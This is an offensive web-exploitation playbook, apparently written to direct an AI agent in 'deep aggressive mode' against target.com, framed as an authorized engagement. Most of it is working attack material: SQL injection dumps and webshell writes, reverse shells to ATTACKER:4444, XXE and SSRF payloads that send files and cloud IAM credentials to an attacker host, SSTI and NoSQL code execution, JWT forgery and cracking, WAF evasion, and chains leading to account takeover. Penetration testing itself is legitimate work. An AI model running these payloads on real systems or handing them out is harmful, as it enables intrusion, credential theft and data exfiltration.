# Skill Playbook: web-expert-agent — DEEP AGGRESSIVE MODE

Authorized-engagement playbook. Executes the full web exploitation lifecycle from fingerprinting to evidence collection. Every phase produces concrete artifacts. Every technique references the authoritative skill library at `/home/dark-devil/HIVEBREACH-work/HIVEBREACH/skills/`.

## Skill Library Index

| Vuln Class | Skill Path |
|---|---|
| SQLi | `skills/penetration-testing/sql-injection.md` |
| XSS | `skills/penetration-testing/xss.md` |
| SSRF | `skills/penetration-testing/ssrf.md` |
| Command Injection | `skills/penetration-testing/command-injection.md` |
| LFI/RFI | `skills/penetration-testing/file-inclusion.md` |
| SSTI | `skills/penetration-testing/ssti.md` |
| XXE | `skills/penetration-testing/xxe.md` |
| NoSQLi | `skills/penetration-testing/nosql-injection.md` |
| IDOR | `skills/penetration-testing/idor.md` |
| JWT | `skills/api-security/jwt-testing.md` |
| BOLA/BFLA | `skills/api-security/bola-bfla.md` |

---

## Phase 1 — Technology Fingerprinting

Goal: identify stack, framework, server, WAF, and DBMS before choosing payloads.

1. Enumerate the endpoint set and fingerprint each host:
```bash
whatweb -a 3 https://target.com
httpx -l /tmp/hosts.txt -title -tech-detect -status-code -follow-redirects
wafw00f https://target.com
curl -sI https://target.com
```
2. Fingerprint server and framework from headers, cookies, and error pages. Note `Server`, `X-Powered-By`, `Set-Cookie` names (PHPSESSID vs JSESSIONID vs ASP.NET_SessionId), and framework hints (Laravel, Rails, Django, Spring, Express).
3. Probe for stack-relevant files:
```bash
curl -s https://target.com/robots.txt
curl -s https://target.com/.git/HEAD
curl -s https://target.com/.env
curl -s https://target.com/wp-json/ (WordPress)
curl -s https://target.com/.well-known/jwks.json (JWT)
curl -s https://target.com/swagger.json /openapi.json
```
4. Fingerprint the DBMS with a parameterized probe (see Phase 4 SQLi). Record WAF presence and its block signature for Phase 5.

Decision: if WAF present, plan tamper escalation from the start. If authenticated area exists, obtain a test account before Phase 2.

---

## Phase 2 — Endpoint and Attack-Surface Mapping

Goal: enumerate every reachable route, parameter, and API surface to rank targets.

1. Content discovery:
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -recursion -recursion-depth 2
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp,json -t 50
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,json,html -d 2
```
2. API surface mapping:
```bash
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403
ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -mc 200
```
3. Parameter mining — identify hidden parameters for injection and IDOR:
```bash
ffuf -u https://target.com/endpoint?FUZZ=1 -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fc 404
```
4. Classify endpoints by function and priority:
   - HIGH: URL-fetch/import (SSRF), file/upload/download (LFI/XXE), search/filter (SQLi/NoSQLi), login/auth/reset (auth bypass, NoSQLi, JWT), templates/export/email-preview (SSTI), ping/traceroute tools (command injection), object CRUD by ID (BOLA/IDOR).
5. Capture all endpoints to `/tmp/endpoints.txt` as the Phase 3 input.

---

## Phase 3 — Automated Scanning

Goal: fast, broad coverage; every result is treated as a candidate, never as a finding.

```bash
# Web vuln templates
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ -jsonl /tmp/nuclei.jsonl -severity high,critical

# Per-class template runs
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/sqli/ -jsonl /tmp/sqli.jsonl
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/ssrf/ -jsonl /tmp/ssrf.jsonl
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/lfi/ -jsonl /tmp/lfi.jsonl
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/xxe/ -jsonl /tmp/xxe.jsonl

# Server-side vuln scan
nikto -h https://target.com -ssl -output /tmp/nikto.txt

# Automated injection triage with sqlmap (level 3 first, then escalate)
sqlmap -u "https://target.com/page?id=1" --batch --level=3 --risk=2 --output-dir=/tmp/sqlmap
```
1. Route all automated traffic through Burp (`--proxy=http://127.0.0.1:8080`) to retain full request/response pairs.
2. Filter and rank candidates by confidence; carry forward the shortlist to Phase 4.
3. Log every automated hit to the false-positive tracker until manually confirmed.

---

## Phase 4 — Manual Deep-Dive per Vuln Class

### 4.1 SQL Injection (all DBs)

Probe entry points with boolean, error, and time payloads:
```bash
curl -s "https://target.com/page?id=1' AND 1=1 -- "
curl -s "https://target.com/page?id=1' AND 1=2 -- "
curl -s "https://target.com/page?id=1' UNION SELECT NULL,NULL,NULL -- "
curl -s "https://target.com/page?id=1' AND EXTRACTVALUE(1,CONCAT(0x3a,@@VERSION)) -- "
curl -s "https://target.com/page?id=1' AND (SELECT SLEEP(5)) -- "
```
Full-aggression automation once a vector is confirmed:
```bash
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 --dbms=mysql --dbs --tables
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 --dump -D targetdb -T users
sqlmap -u "https://target.com/page?id=1" --batch --os-shell
```
File write chain (MySQL):
```bash
sqlmap -u "https://target.com/page?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php
curl "https://target.com/shell.php?c=id"
```
OOB exfil (MSSQL): `EXEC master..xp_dirtree '\\ATTACKER\data' --`. Verify with a listener on ATTACKER.

### 4.2 XSS (all contexts and WAF bypass)

Reflection testing set:
```html
<script>alert(1)</script>
"><svg onload=alert(1)>
' onfocus=alert(1) autofocus x='
";alert(1);//
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
<marquee/onstart=alert(1)>
javascript:alert(1)
${alert(1)}
```
CSP bypass probes:
```html
<script src="https://api.target.com/callback?callback=alert(1)"></script>
<script nonce="bypassed">alert(1)</script>
```
Stored/Blind XSS callback:
```html
<script src=https://SUB.xss.ht></script>
```
Tooling:
```bash
xsser --url "https://target.com/search?q=XSS" --auto --reverse-check
dalfox url "https://target.com/search?q=test" --blind "https://SUB.interactsh.example.com" --waf-evasion
```
Confirmation criteria: alert/domain execution in a headless browser, or an OOB callback, or unencoded reflection in the raw response.

### 4.3 SSRF (cloud metadata and gopher)

Probe URL-fetch, preview, webhook, import, and avatar endpoints:
```bash
curl -s "https://target.com/fetch?url=http://127.0.0.1"
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "https://target.com/fetch?url=http://0x7F000001/latest/meta-data/"
curl -s "https://target.com/fetch?url=file:///etc/passwd"
```
Cloud credential chain:
```bash
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
curl -s "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
curl -s "https://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```
Internal port scan via timing:
```bash
for port in 22 80 443 3306 5432 6379 9000 9200 2375 27017; do
  curl -s -o /dev/null -w "%{http_code} %{time_total} $port\n" "https://target.com/fetch?url=http://127.0.0.1:$port"
done
```
SSRF to RCE via gopher (Redis / MySQL / FastCGI):
```bash
gopherus --exploit redis --rhost 127.0.0.1 --rport 6379 --lhost ATTACKER --lport 4444
gopherus --exploit fastcgi --rhost 127.0.0.1 --rport 9000 --script /var/www/html/shell.php
```
Blind SSRF proof: `curl -s "https://target.com/fetch?url=http://UNIQUE.interactsh.example.com"` — a DNS hit is proof.

### 4.4 Command Injection

Detection:
```bash
curl -s "https://target.com/ping?host=127.0.0.1;id"
curl -s "https://target.com/ping?host=127.0.0.1|id"
curl -s "https://target.com/ping?host=127.0.0.1;sleep 5"
curl -s "https://target.com/ping?host=127.0.0.1;curl http://UNIQUE.interactsh.example.com/$(whoami)"
```
Automation:
```bash
commix -u "https://target.com/ping?host=127.0.0.1" --batch --level=3 --risk=3
commix -u "https://target.com/ping?host=127.0.0.1" --batch --os-shell
```
Reverse shells on confirmation:
```bash
# bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# netcat
nc -e /bin/bash ATTACKER 4444
# socat
socat TCP:ATTACKER:4444 EXEC:/bin/sh
```
Listener: `nc -lvnp 4444`.

### 4.5 LFI / RFI (php wrappers and log poisoning)

Traversal and wrappers:
```bash
curl -s "https://target.com/page?file=../../../../etc/passwd"
curl -s "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
curl -s "https://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B&cmd=id"
curl -s -d '<?php system("id"); ?>' "https://target.com/page?file=php://input"
```
Log poisoning to RCE:
```bash
curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "https://target.com/"
curl -s "https://target.com/page?file=/var/log/apache2/access.log&c=id"
curl -s "https://target.com/page?file=/var/log/nginx/access.log&c=id"
curl -s "https://target.com/page?file=/proc/self/environ&c=id"
```
PHP filter chain RCE:
```bash
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
```
Tooling: `kadimus -u "https://target.com/page?file=index.php" --shell`.

### 4.6 SSTI (all engines)

Detection set and fingerprint:
```bash
curl -s "https://target.com/page?name={{7*7}}"
curl -s "https://target.com/page?name=${7*7}"
curl -s "https://target.com/page?name={{7*'7'}}"
```
Engine-specific RCE:
```jinja2
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```
```twig
{{['id']|filter('system')}}
```
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```
```erb
<%= system("id") %>
```
Automation: `tplmap -u "https://target.com/page?name=test" --os-shell`.

### 4.7 XXE (OOB exfil)

In-band and OOB:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
```bash
curl -s -X POST "https://target.com/api/upload" -H "Content-Type: application/xml" --data @xxe.xml
```
Blind OOB DTD on ATTACKER (`evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?%file;'>">
%eval;
%exfil;
```
Trigger: `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe; ]><foo>t</foo>`. Watch the ATTACKER HTTP log for the exfil line.
SSRF via XXE to metadata: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`.
Tooling: `ruby XXEinjector.rb --host=ATTACKER --file=/tmp/req.txt --path=/etc/passwd --oob=http`.

### 4.8 NoSQL Injection (MongoDB operators)

Auth bypass:
```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$gt":""},"password":{"$gt":""}}
```
```bash
curl -s "https://target.com/api/login" -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```
Blind regex extraction:
```json
{"username":"admin","password":{"$regex":"^a"}}
```
Timing and RCE:
```json
{"$where":"sleep(5000)"}
{"$where":"this.a==1 && function(){ require('child_process').exec('id', function(e,s,c){ print(s) }) }()"}
```
Tooling: NoSQLMap interactive session.

### 4.9 IDOR / BOLA / BFLA

Two-account model:
```bash
curl -s "https://target.com/api/orders/1000" -H "Authorization: Bearer <tokenB>"
ffuf -u "https://target.com/api/orders/FUZZ" -w <(seq 1000 1100) -H "Authorization: Bearer <tokenB>" -mc 200
curl -s -X PATCH "https://target.com/api/orders/1000" -H "Authorization: Bearer <tokenB>" -H "Content-Type: application/json" -d '{"status":"cancelled"}'
```
BFLA:
```bash
for ep in admin/users admin/export internal/stats debug; do
  curl -s -o /dev/null -w "%{http_code} /api/$ep\n" "https://target.com/api/$ep" -H "Authorization: Bearer <tokenB>"
done
```
Mass assignment escalation: `PATCH /api/users/ID` with `{"role":"admin","isActive":true}`.
GraphQL alias batching: `query { a: order(id:1){id} b: order(id:2){id} }`.

### 4.10 JWT (alg confusion, cracking)

```bash
jwt_tool <token>                                  # decode
jwt_tool <token> -t https://target.com/api/me -rh "Authorization: Bearer <token>" -M at
jwt_tool <token> -X a                             # alg=none
jwt_tool <token> -X s -pc role -pv admin          # claim swap
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt   # crack secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
jwt_tool <token> -X k -ju "http://ATTACKER/jwks.json"     # JWKS injection
jwt_tool <token> -X i -I -hc kid -hv ../../dev/null        # kid traversal
```
RS256 to HS256: fetch `/.well-known/jwks.json`, sign forged token with public key as HMAC secret.

---

## Phase 5 — WAF Bypass

Escalate tamper level only after confirming a WAF signature. Ranked ladder:

1. Case and encoding mutation:
```bash
sqlmap -u "https://target.com/page?id=1" --batch --level=5 --risk=3 --tamper=space2comment,between,charencode,versionedkeywords,randomcase
```
2. Character-level obfuscation:
   - SQLi: `/**/` comments, inline `%09`/`%0a`, `versionedkeywords`.
   - Command injection: `${IFS}` instead of spaces, `c""at` / `c'a't` / `c\at`, hex `$'\x20'`, wildcards `c* /e*/*ss*d`.
   - XSS: entity encoding `&#x3C;`, URL `%3C`, case mutation, comment-split tags, polyglots.
3. Protocol/encoding tricks:
   - SQLi: `%2527` double encode, `%u0027` Unicode.
   - SSRF: decimal/hex/octal IPs, DNS rebinding, redirect chains.
   - LFI: `..%2f`, `..%c0%af`, `..;/`, double encoding.
4. Token/body smuggling: multipart chunking, HTTP/1.1 vs HTTP/2, content-type confusion (`application/json` body parsed as XML for XXE).
5. Rate-aware: maintain request pacing; rotate `User-Agent`/`X-Forwarded-For` only within RoE.

---

## Phase 6 — Chaining

Compound single bugs into high-impact paths. Validate each hop.

- SQLi -> file write -> webshell: `INTO OUTFILE` to webroot, then `curl shell.php?c=id`.
- SQLi -> OOB: `LOAD_FILE`/`UTL_HTTP`/`xp_dirtree` to exfil data without in-band reflection.
- SSRF -> cloud creds -> privesc: AWS metadata IAM keys -> `aws sts get-caller-identity` -> enumerate S3/SSM -> `aws ssm send-command`.
- LFI -> log poisoning -> RCE: payload in User-Agent, read access.log, execute `?c=id`.
- XXE -> SSRF: file read then pivot to internal admin on `127.0.0.1:PORT`.
- NoSQLi auth bypass -> `$where` RCE -> reverse shell.
- IDOR write -> ATO: email change via BOLA -> password reset -> reset token in attacker inbox -> login as victim.
- JWT theft (XSS) -> crack/tamper -> replay on admin API.
- Stored XSS -> admin session theft -> internal network pivot.

Document the full chain with each hop's evidence; a chain is only reported once every hop is confirmed.

---

## Phase 7 — Evidence Collection

1. Capture every finding with literal request/response pairs (Burp export or raw curl output).
2. Preserve tool artifacts: sqlmap `--output-dir`, nuclei JSONL, interactsh/`xss.ht` callback logs, screenshots of alert/shell confirmation.
3. For each confirmed finding produce a PoC template: URL, method, parameter, payload, type, evidence, impact, remediation, reproduction steps (per the skill playbook templates).
4. Tag confidence: `confirmed` (independently reproduced), `likely`, `tentative`.
5. Log all discarded automated hits to `false-positives.log` with justification.
6. Map each finding to OWASP Top 10 (2021), OWASP API Security, and MITRE ATT&CK; assign CVSS reflecting real business impact.

---

## Verification Checklist

- [ ] Every confirmed finding has a working, independently reproduced PoC.
- [ ] SQLi: manual probe verified in addition to sqlmap output; DBMS identified.
- [ ] XSS: execution proven in browser, or OOB callback captured, or unencoded reflection shown.
- [ ] SSRF: direct response shown or interactsh DNS/HTTP callback logged.
- [ ] Command injection: echo marker, timing delta, or OOB callback captured.
- [ ] LFI: file contents or RCE output shown; wrapper identified.
- [ ] SSTI: engine identified and RCE chain output verified.
- [ ] XXE: file read or OOB exfil callback confirmed.
- [ ] NoSQLi: auth bypass or data extraction confirmed with backend identified.
- [ ] IDOR/BOLA/BFLA: two-account reproduction; object ownership verified before/after.
- [ ] JWT: forged token accepted (200) vs baseline (401); cracked secret recorded.
- [ ] WAF bypass: tamper method documented for each bypassed filter.
- [ ] Chained paths: every hop evidenced; no unverified links in the chain.
- [ ] Scope respected: no out-of-scope traffic, no destructive or production-modifying actions, no rate-limit abuse.
- [ ] Sandbox verification performed for all RCE/credential-theft impacts per skill playbook requirements.
- [ ] Evidence artifacts archived and cross-referenced to finding IDs.
